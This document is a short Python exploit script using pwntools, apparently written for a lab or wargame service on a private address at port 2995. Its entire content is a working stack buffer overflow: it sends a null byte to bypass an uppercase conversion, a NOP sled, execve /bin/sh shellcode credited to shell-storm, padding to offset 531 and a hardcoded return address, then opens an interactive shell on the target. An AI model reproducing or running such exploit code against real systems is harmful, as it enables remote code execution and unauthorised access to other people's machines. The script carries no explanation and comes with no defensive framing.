import pwn

host = "192.168.1.251"
port = 2995

r = pwn.remote(host,port)

# http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode= b"\x31\xC0\x31\xC9\x31\xD2\x50\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\xB0\x0B\xCD\x80"
offset = 531
nop_len = 100
buff = pwn.p32(0xbffffa4a)
junk = b"\x00" # bypass toUpper()
payload = junk + b"\x90" * nop_len + shellcode + b"\x90" * (offset - len(shellcode) - nop_len) + buff #b"\x80\xfa\xff\xbf"

r.sendline(payload)
r.interactive()
r.close()